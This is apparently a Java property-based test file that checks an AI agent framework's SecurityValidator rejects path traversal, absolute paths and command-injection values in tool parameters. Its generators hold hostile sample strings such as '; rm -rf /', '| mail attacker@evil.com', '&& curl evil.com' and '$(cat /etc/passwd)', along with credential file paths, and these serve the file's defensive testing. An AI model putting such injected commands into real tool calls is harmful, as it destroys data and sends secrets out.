package com.wmsay.gpt4_lll.fc.property;

import com.wmsay.gpt4_lll.fc.model.ValidationResult;
import com.wmsay.gpt4_lll.fc.tools.SecurityValidator;
import net.jqwik.api.*;

import java.util.*;

/**
 * 属性测试: SecurityValidator 恶意输入检测 (Property 8)
 * <p>
 * 验证路径遍历和命令注入模式被正确检测和拒绝。
 * <p>
 * **Validates: Requirements 3.9**
 */
class ValidationPropertyTest {

    private final SecurityValidator validator = new SecurityValidator();

    // Known path parameter names recognized by SecurityValidator
    private static final List<String> PATH_PARAM_NAMES = List.of(
            "path", "file", "filePath", "file_path", "directory", "dir", "target", "destination"
    );

    // Known command parameter names recognized by SecurityValidator
    private static final List<String> COMMAND_PARAM_NAMES = List.of(
            "command", "cmd", "exec", "shell", "script", "query"
    );

    // ---------------------------------------------------------------
    // Property 8a: Path traversal patterns are always detected
    // Validates: Requirements 3.9
    // ---------------------------------------------------------------

    /**
     * Property 8: SecurityValidator malicious input detection — path traversal
     * <p>
     * For any path-type parameter containing ../ or ..\ patterns,
     * SecurityValidator must return an invalid result.
     */
    @Property(tries = 200)
    @Tag("Feature: agent-framework-extraction, Property 8: SecurityValidator malicious input detection")
    @Label("Path traversal patterns in path params are always detected")
    void pathTraversalPatternsAlwaysDetected(
            @ForAll("pathParamNames") String paramName,
            @ForAll("pathTraversalValues") String maliciousPath) {

        Map<String, Object> params = Map.of(paramName, maliciousPath);
        ValidationResult result = validator.validate("any_tool", params);

        assert !result.isValid() :
                "Expected invalid result for path traversal in param '" + paramName +
                        "' with value '" + maliciousPath + "'";
        assert !result.getErrors().isEmpty() :
                "Expected at least one error for path traversal";
    }

    // ---------------------------------------------------------------
    // Property 8b: Absolute paths are always detected
    // Validates: Requirements 3.9
    // ---------------------------------------------------------------

    /**
     * Property 8: SecurityValidator malicious input detection — absolute paths
     * <p>
     * For any path-type parameter containing absolute Unix paths (starting with /)
     * or Windows paths (starting with C:\), SecurityValidator must return invalid.
     */
    @Property(tries = 200)
    @Tag("Feature: agent-framework-extraction, Property 8: SecurityValidator malicious input detection")
    @Label("Absolute paths in path params are always detected")
    void absolutePathsAlwaysDetected(
            @ForAll("pathParamNames") String paramName,
            @ForAll("absolutePathValues") String absolutePath) {

        Map<String, Object> params = Map.of(paramName, absolutePath);
        ValidationResult result = validator.validate("any_tool", params);

        assert !result.isValid() :
                "Expected invalid result for absolute path in param '" + paramName +
                        "' with value '" + absolutePath + "'";
        assert !result.getErrors().isEmpty() :
                "Expected at least one error for absolute path";
    }

    // ---------------------------------------------------------------
    // Property 8c: Command injection patterns are always detected
    // Validates: Requirements 3.9
    // ---------------------------------------------------------------

    /**
     * Property 8: SecurityValidator malicious input detection — command injection
     * <p>
     * For any command-type parameter containing injection characters
     * (;, |, &, `, $(), ||, &&), SecurityValidator must return invalid.
     */
    @Property(tries = 200)
    @Tag("Feature: agent-framework-extraction, Property 8: SecurityValidator malicious input detection")
    @Label("Command injection patterns in command params are always detected")
    void commandInjectionPatternsAlwaysDetected(
            @ForAll("commandParamNames") String paramName,
            @ForAll("commandInjectionValues") String maliciousCommand) {

        Map<String, Object> params = Map.of(paramName, maliciousCommand);
        ValidationResult result = validator.validate("any_tool", params);

        assert !result.isValid() :
                "Expected invalid result for command injection in param '" + paramName +
                        "' with value '" + maliciousCommand + "'";
        assert !result.getErrors().isEmpty() :
                "Expected at least one error for command injection";
    }

    // ---------------------------------------------------------------
    // Property 8d: Safe relative paths pass validation
    // Validates: Requirements 3.9
    // ---------------------------------------------------------------

    /**
     * Property 8: SecurityValidator malicious input detection — safe paths pass
     * <p>
     * Safe relative paths (no traversal, no absolute prefix) in path parameters
     * should pass validation.
     */
    @Property(tries = 200)
    @Tag("Feature: agent-framework-extraction, Property 8: SecurityValidator malicious input detection")
    @Label("Safe relative paths in path params pass validation")
    void safeRelativePathsPassValidation(
            @ForAll("pathParamNames") String paramName,
            @ForAll("safeRelativePaths") String safePath) {

        Map<String, Object> params = Map.of(paramName, safePath);
        ValidationResult result = validator.validate("any_tool", params);

        assert result.isValid() :
                "Expected valid result for safe path in param '" + paramName +
                        "' with value '" + safePath + "', but got errors: " + result.getErrors();
    }

    // ---------------------------------------------------------------
    // Property 8e: Safe commands pass validation
    // Validates: Requirements 3.9
    // ---------------------------------------------------------------

    /**
     * Property 8: SecurityValidator malicious input detection — safe commands pass
     * <p>
     * Commands without injection characters should pass validation.
     */
    @Property(tries = 200)
    @Tag("Feature: agent-framework-extraction, Property 8: SecurityValidator malicious input detection")
    @Label("Safe commands without injection characters pass validation")
    void safeCommandsPassValidation(
            @ForAll("commandParamNames") String paramName,
            @ForAll("safeCommands") String safeCommand) {

        Map<String, Object> params = Map.of(paramName, safeCommand);
        ValidationResult result = validator.validate("any_tool", params);

        assert result.isValid() :
                "Expected valid result for safe command in param '" + paramName +
                        "' with value '" + safeCommand + "', but got errors: " + result.getErrors();
    }

    // ---------------------------------------------------------------
    // Providers (Arbitraries)
    // ---------------------------------------------------------------

    @Provide
    Arbitrary<String> pathParamNames() {
        return Arbitraries.oneOf(
                // Exact known names
                Arbitraries.of(PATH_PARAM_NAMES),
                // Names containing "path", "file", or "dir" (case-insensitive match)
                Arbitraries.of("outputPath", "inputFile", "baseDir", "srcDirectory",
                        "targetFilePath", "configFile", "logDir")
        );
    }

    @Provide
    Arbitrary<String> commandParamNames() {
        return Arbitraries.oneOf(
                // Exact known names
                Arbitraries.of(COMMAND_PARAM_NAMES),
                // Names containing "command" or "cmd"
                Arbitraries.of("shellCommand", "buildCmd", "userCommand", "execCmd")
        );
    }

    @Provide
    Arbitrary<String> pathTraversalValues() {
        // Generate strings that contain ../ or ..\ patterns
        Arbitrary<String> prefixes = Arbitraries.of("", "src/", "data/", "some/nested/");
        Arbitrary<String> traversals = Arbitraries.of("../", "..\\");
        Arbitrary<String> suffixes = Arbitraries.of(
                "etc/passwd", "secret.txt", "config.json", "data.db",
                "../more", "..\\more", "file.txt"
        );

        return Combinators.combine(prefixes, traversals, suffixes)
                .as((prefix, traversal, suffix) -> prefix + traversal + suffix);
    }

    @Provide
    Arbitrary<String> absolutePathValues() {
        return Arbitraries.oneOf(
                // Unix absolute paths
                Arbitraries.of(
                        "/etc/passwd", "/usr/bin/env", "/tmp/data",
                        "/home/user/.ssh/id_rsa", "/var/log/syslog", "/root/.bashrc"
                ),
                // Windows absolute paths
                Arbitraries.of("A", "B", "C", "D", "E", "F", "G", "H")
                        .flatMap(drive -> Arbitraries.of(
                                "\\Windows\\System32", "\\Users\\admin",
                                "/Program Files/app", "\\temp\\data"
                        ).map(rest -> drive + ":" + rest))
        );
    }

    @Provide
    Arbitrary<String> commandInjectionValues() {
        // Generate commands containing injection patterns
        Arbitrary<String> safePrefix = Arbitraries.of("ls", "echo hello", "cat file", "grep pattern", "npm run");
        Arbitrary<String> injections = Arbitraries.of(
                "; rm -rf /",
                "| mail attacker@evil.com",
                "&& curl evil.com",
                "|| wget evil.com",
                "`whoami`",
                "$(cat /etc/passwd)"
        );

        return Combinators.combine(safePrefix, injections)
                .as((prefix, injection) -> prefix + " " + injection);
    }

    @Provide
    Arbitrary<String> safeRelativePaths() {
        // Generate safe relative paths: no ../, no ..\, no leading /, no C:\ prefix
        Arbitrary<String> segments = Arbitraries.of(
                "src", "main", "java", "test", "resources", "config",
                "data", "lib", "build", "output", "docs", "utils"
        );

        Arbitrary<String> filenames = Arbitraries.of(
                "App.java", "config.json", "README.md", "index.ts",
                "data.csv", "schema.sql", "test.py", "build.gradle"
        );

        return Combinators.combine(
                segments.list().ofMinSize(1).ofMaxSize(3),
                filenames
        ).as((segs, file) -> String.join("/", segs) + "/" + file);
    }

    @Provide
    Arbitrary<String> safeCommands() {
        // Generate commands without any injection characters (; | & ` $()
        return Arbitraries.of(
                "ls -la",
                "echo hello world",
                "cat README.md",
                "grep -r pattern src",
                "npm run build",
                "python script.py",
                "java -jar app.jar",
                "git status",
                "mvn clean install",
                "gradle test",
                "node index.js",
                "cargo build",
                "make all",
                "cmake ..",
                "rustc main.rs"
        );
    }
}
